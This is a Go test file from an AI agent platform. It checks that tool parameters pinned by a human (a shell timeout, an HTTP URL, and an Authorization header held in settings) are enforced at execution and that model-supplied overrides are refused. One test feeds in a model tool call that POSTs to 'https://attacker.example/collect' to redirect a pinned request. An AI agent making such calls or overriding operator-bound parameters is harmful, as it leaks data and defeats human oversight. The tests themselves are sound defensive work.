// Copyright (c) 2025 Reliant Labs
package handlers

import (
	"context"
	"crypto/x509"
	"fmt"
	"net/http"
	"net/http/httptest"
	"sync"
	"testing"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"google.golang.org/protobuf/encoding/protojson"
	"google.golang.org/protobuf/types/known/structpb"

	"github.com/reliant-labs/reliant/internal/db"
	dbcore "github.com/reliant-labs/reliant/internal/db/core"
	"github.com/reliant-labs/reliant/internal/integrations/httpaction"
	"github.com/reliant-labs/reliant/internal/llm/tools"
	"github.com/reliant-labs/reliant/internal/models/message"
	"github.com/reliant-labs/reliant/internal/netguard"
	"github.com/reliant-labs/reliant/internal/rctx"
	"github.com/reliant-labs/reliant/internal/toolbindings"
	"github.com/reliant-labs/reliant/internal/toolexec"
)

// A bound parameter is fixed by a human: call_llm removes it from the schema
// the model is offered, and it must take effect when the call RUNS. These
// drive a turn through the real activities — call_llm records the turn's set,
// the set crosses a serialization boundary the way it crosses Temporal
// history, and execute_tools runs the model's calls on the real executor
// paths — and assert on what the tool actually received.
//
// Before bindings reached execution, execute_tools built a fresh, unbound
// tool from the factory: the bound value never arrived, and a model that sent
// the hidden parameter anyway had its own value honored. A workflow that
// pinned an integration's URL pinned nothing.

// http__request is the generic HTTP integration's tool: server-placed, so it
// runs in the worker's own executor.
const httpRequestTool = "http__request"

func structOf(t *testing.T, fields map[string]any) *structpb.Struct {
	t.Helper()
	s, err := structpb.NewStruct(fields)
	require.NoError(t, err)
	return s
}

// daemonRunningRouter stands in for the daemon gateway. It records the input
// each call arrives with, and checks it the way the daemon will receive it:
// the daemon builds a fresh, UNBOUND tool from its own factory
// (daemonruntime/runtime.go) and decodes the input into that tool's full
// parameter struct, rejecting unknown fields. A command is not actually run.
type daemonRunningRouter struct {
	toolexec.DaemonRouter
	daemonFactory *tools.ToolsFactory

	mu     sync.Mutex
	inputs map[string]string
}

func newDaemonRunningRouter() *daemonRunningRouter {
	return &daemonRunningRouter{
		daemonFactory: tools.NewToolsFactory(&tools.ToolsOptions{}),
		inputs:        map[string]string{},
	}
}

func (r *daemonRunningRouter) SendToolRequestSync(_ context.Context, _ string, req *toolexec.ToolExecutionRequest) (*toolexec.ToolExecutionResponse, error) {
	r.mu.Lock()
	r.inputs[req.ToolCallID] = req.ToolInput
	r.mu.Unlock()
	tool := r.daemonFactory.GetToolByName(req.ToolName, nil)
	if tool == nil {
		return &toolexec.ToolExecutionResponse{RequestID: req.RequestID, IsError: true, Content: "unknown tool on the daemon"}, nil
	}
	tc := &rctx.ToolContext{Context: context.Background()}
	if _, err := tool.RequiresPermission(tc, tools.ToolCall{ID: req.ToolCallID, Name: req.ToolName, Input: req.ToolInput}); err != nil {
		return &toolexec.ToolExecutionResponse{RequestID: req.RequestID, IsError: true, Content: "the daemon's tool rejected the input: " + err.Error()}, nil
	}
	return &toolexec.ToolExecutionResponse{RequestID: req.RequestID, Success: true, Content: "ran on the daemon"}, nil
}

func (r *daemonRunningRouter) SendToolRequestSyncWithSelector(ctx context.Context, userID string, req *toolexec.ToolExecutionRequest, _ *toolexec.DaemonSelector) (*toolexec.ToolExecutionResponse, error) {
	return r.SendToolRequestSync(ctx, userID, req)
}

// Generic commands (the batch's worktree.ensure) are answered the way a daemon
// that does not know them answers; the batch then runs as it always did.
func (r *daemonRunningRouter) SendDaemonCommand(_ context.Context, _ string, commandType string, _ []byte, _ int32) ([]byte, error) {
	return nil, fmt.Errorf("unknown daemon command %q", commandType)
}

func (r *daemonRunningRouter) SendDaemonCommandToDaemon(ctx context.Context, userID, _ string, commandType string, payload []byte, timeoutMs int32) ([]byte, error) {
	return r.SendDaemonCommand(ctx, userID, commandType, payload, timeoutMs)
}

// received is the input the daemon got for a call, and whether it got one.
func (r *daemonRunningRouter) received(toolCallID string) (string, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	input, ok := r.inputs[toolCallID]
	return input, ok
}

// workerExecutor is the worker's executor as serverworker wires it: daemon
// tools go to the router, server tools run in-process on the worker's factory.
func workerExecutor(router toolexec.DaemonRouter, repo db.Repository) toolexec.ToolExecutor {
	executor := toolexec.NewRemoteExecutor(router)
	executor.SetServerExecutor(toolexec.NewLocalToolExecutor(tools.NewToolsFactory(&tools.ToolsOptions{Repo: repo})))
	return executor
}

// pinnedEndpoint is an HTTPS server the http integration may reach, recording
// every request it serves.
type pinnedEndpoint struct {
	url string

	mu       sync.Mutex
	requests []*http.Request
}

func newPinnedEndpoint(t *testing.T) *pinnedEndpoint {
	t.Helper()
	endpoint := &pinnedEndpoint{}
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		endpoint.mu.Lock()
		endpoint.requests = append(endpoint.requests, r.Clone(context.Background()))
		endpoint.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"ok":true}`))
	}))
	t.Cleanup(srv.Close)
	endpoint.url = srv.URL

	guard := netguard.New()
	guard.AllowLoopback = true
	pool := x509.NewCertPool()
	pool.AddCert(srv.Certificate())
	t.Cleanup(tools.UseIntegrationRunner(httpaction.NewRunner(guard).WithRootCAs(pool)))
	return endpoint
}

func (e *pinnedEndpoint) served() []*http.Request {
	e.mu.Lock()
	defer e.mu.Unlock()
	return append([]*http.Request(nil), e.requests...)
}

func requireFailedRow(t *testing.T, repo db.Repository, toolCallID string) {
	t.Helper()
	row, err := repo.GetToolCall(context.Background(), toolCallID)
	require.NoError(t, err)
	require.NotNil(t, row, "a refused call is still recorded")
	assert.Equal(t, dbcore.ToolCallStatusFailed, row.Status)
}

// The daemon path. shell runs on the user's machine, so execute_tools hands
// the call to the daemon gateway and the daemon builds its own tool. The
// bound value must cross the wire with the call, and the daemon must accept
// it — whatever version of the daemon it is, so nothing new is asked of it.
func TestBoundParameters_TakeEffectOnTheDaemonPath(t *testing.T) {
	f := setupNoMachineFixture(t, false)
	cfg := toolsConfig(tools.PermissionMutating, []string{tools.ShellToolName}, nil, nil)
	cfg.Tools = map[string]*structpb.Struct{tools.ShellToolName: structOf(t, map[string]any{"timeout": 30000})}
	recorded := throughHistory(t, f.turn(t, cfg, nil).GetCapabilities())

	router := newDaemonRunningRouter()
	executed := f.execute(t, workerExecutor(router, f.h.Repo()), recorded,
		message.ToolCall{ID: "call-omits", Name: tools.ShellToolName, Input: `{"command":"make test"}`},
		message.ToolCall{ID: "call-overrides", Name: tools.ShellToolName, Input: `{"command":"make test","timeout":600000}`},
		message.ToolCall{ID: "call-repeats", Name: tools.ShellToolName, Input: `{"command":"make test","timeout":30000}`},
	)
	results := resultsByID(executed.GetToolResults())

	t.Run("the bound value reaches the daemon and an unbound parameter is untouched", func(t *testing.T) {
		input, sent := router.received("call-omits")
		require.True(t, sent, "the call must be dispatched")
		assert.JSONEq(t, `{"command":"make test","timeout":30000}`, input)
		assert.False(t, results["call-omits"].GetIsError(), results["call-omits"].GetContent())
	})

	t.Run("a model-supplied value for a bound parameter is refused, never dispatched", func(t *testing.T) {
		_, sent := router.received("call-overrides")
		assert.False(t, sent, "the model's timeout must not reach the daemon")
		assert.True(t, results["call-overrides"].GetIsError())
		assert.Contains(t, results["call-overrides"].GetContent(), "'timeout'")
		requireFailedRow(t, f.h.Repo(), "call-overrides")
	})

	t.Run("a model that repeats the bound value is not refused", func(t *testing.T) {
		input, sent := router.received("call-repeats")
		require.True(t, sent)
		assert.JSONEq(t, `{"command":"make test","timeout":30000}`, input)
		assert.False(t, results["call-repeats"].GetIsError(), results["call-repeats"].GetContent())
	})
}

// The local path. An integration tool runs in the worker's own executor, on
// a tool the factory builds fresh for the call. A workflow that pins the URL
// must get requests to that URL and nowhere else.
func TestBoundParameters_TakeEffectOnTheLocalPath(t *testing.T) {
	f := setupNoMachineFixture(t, false)
	endpoint := newPinnedEndpoint(t)

	cfg := toolsConfig(tools.PermissionMutating, []string{tools.ToolView, httpRequestTool}, nil, nil)
	cfg.Tools = map[string]*structpb.Struct{httpRequestTool: structOf(t, map[string]any{"url": endpoint.url + "/pinned"})}
	recorded := throughHistory(t, f.turn(t, cfg, nil).GetCapabilities())
	require.Contains(t, recorded.GetOffered(), httpRequestTool, "precondition: the integration tool is offered")

	executed := f.execute(t, workerExecutor(newDaemonRunningRouter(), f.h.Repo()), recorded,
		message.ToolCall{ID: "call-pinned", Name: httpRequestTool, Input: `{"method":"POST","body":{"note":"from the model"}}`},
	)
	result := executed.GetToolResults()[0]
	require.False(t, result.GetIsError(), result.GetContent())
	served := endpoint.served()
	require.Len(t, served, 1, "the request goes to the pinned URL")
	assert.Equal(t, "/pinned", served[0].URL.Path)
	assert.Equal(t, http.MethodPost, served[0].Method, "an unbound parameter comes from the model")

	redirected := f.execute(t, workerExecutor(newDaemonRunningRouter(), f.h.Repo()), recorded,
		message.ToolCall{ID: "call-redirect", Name: httpRequestTool, Input: `{"url":"https://attacker.example/collect","method":"POST"}`},
	).GetToolResults()[0]
	assert.True(t, redirected.GetIsError(), "a model may not redirect a pinned request")
	assert.Contains(t, redirected.GetContent(), "'url'")
	assert.NotContains(t, redirected.GetContent(), endpoint.url, "the refusal does not reveal the bound value")
	assert.Len(t, endpoint.served(), 1, "nothing further was sent anywhere")
	requireFailedRow(t, f.h.Repo(), "call-redirect")
}

// A binding can carry a secret — the http integration's headers are the
// natural place for an Authorization header — and the run owner's global
// setting is not otherwise in workflow history. So the set records a globally
// bound parameter by NAME, and execution re-reads its value from the setting.
// The workflow's own bindings are carried: they are already in history, as
// call_llm's own input.
func TestGlobalBoundParameters_AreReadAtExecutionNotCarriedInHistory(t *testing.T) {
	f := setupNoMachineFixture(t, false)
	endpoint := newPinnedEndpoint(t)
	const secret = "Bearer s3cret-from-settings"

	ctx := context.Background()
	setting := &db.Setting{
		ID:        uuid.NewString(),
		UserID:    f.chat.UserID,
		Key:       toolbindings.GlobalSettingKey(httpRequestTool),
		Value:     `{"headers":{"literal":{"Authorization":"` + secret + `"}}}`,
		ValueType: "json",
	}
	require.NoError(t, f.h.Repo().CreateSetting(ctx, setting))

	cfg := toolsConfig(tools.PermissionMutating, []string{httpRequestTool}, nil, nil)
	cfg.Tools = map[string]*structpb.Struct{httpRequestTool: structOf(t, map[string]any{"url": endpoint.url + "/hook"})}
	output := f.turn(t, cfg, nil)
	encoded, err := protojson.Marshal(output.GetCapabilities())
	require.NoError(t, err)
	assert.NotContains(t, string(encoded), "s3cret", "a global setting's value never enters workflow history")
	assert.Contains(t, string(encoded), endpoint.url+"/hook", "the workflow's own binding is carried")
	recorded := throughHistory(t, output.GetCapabilities())

	executed := f.execute(t, workerExecutor(newDaemonRunningRouter(), f.h.Repo()), recorded,
		message.ToolCall{ID: "call-with-setting", Name: httpRequestTool, Input: `{"method":"GET"}`})
	require.False(t, executed.GetToolResults()[0].GetIsError(), executed.GetToolResults()[0].GetContent())
	served := endpoint.served()
	require.Len(t, served, 1)
	assert.Equal(t, secret, served[0].Header.Get("Authorization"), "the setting's value is applied at execution")
	assert.Equal(t, "/hook", served[0].URL.Path)

	// The owner removes the setting before the call runs. The model was not
	// shown `headers`, so running without the value it was bound to would run
	// a call nobody configured.
	require.NoError(t, f.h.Repo().DeleteSetting(ctx, setting.ID))
	refused := f.execute(t, workerExecutor(newDaemonRunningRouter(), f.h.Repo()), recorded,
		message.ToolCall{ID: "call-setting-gone", Name: httpRequestTool, Input: `{"method":"GET"}`}).GetToolResults()[0]
	assert.True(t, refused.GetIsError())
	assert.Contains(t, refused.GetContent(), "'headers'")
	assert.Len(t, endpoint.served(), 1, "the call did not run")
	requireFailedRow(t, f.h.Repo(), "call-setting-gone")
}

// A tool nobody bound runs exactly as the model called it.
func TestUnboundTool_RunsWithTheModelsInputUnchanged(t *testing.T) {
	f := setupNoMachineFixture(t, false)
	cfg := toolsConfig(tools.PermissionMutating, []string{tools.ShellToolName}, nil, nil)
	recorded := throughHistory(t, f.turn(t, cfg, nil).GetCapabilities())

	router := newDaemonRunningRouter()
	f.execute(t, workerExecutor(router, f.h.Repo()), recorded,
		message.ToolCall{ID: "call-unbound", Name: tools.ShellToolName, Input: `{"command":"ls","timeout":600000}`})
	input, sent := router.received("call-unbound")
	require.True(t, sent)
	assert.JSONEq(t, `{"command":"ls","timeout":600000}`, input)
}
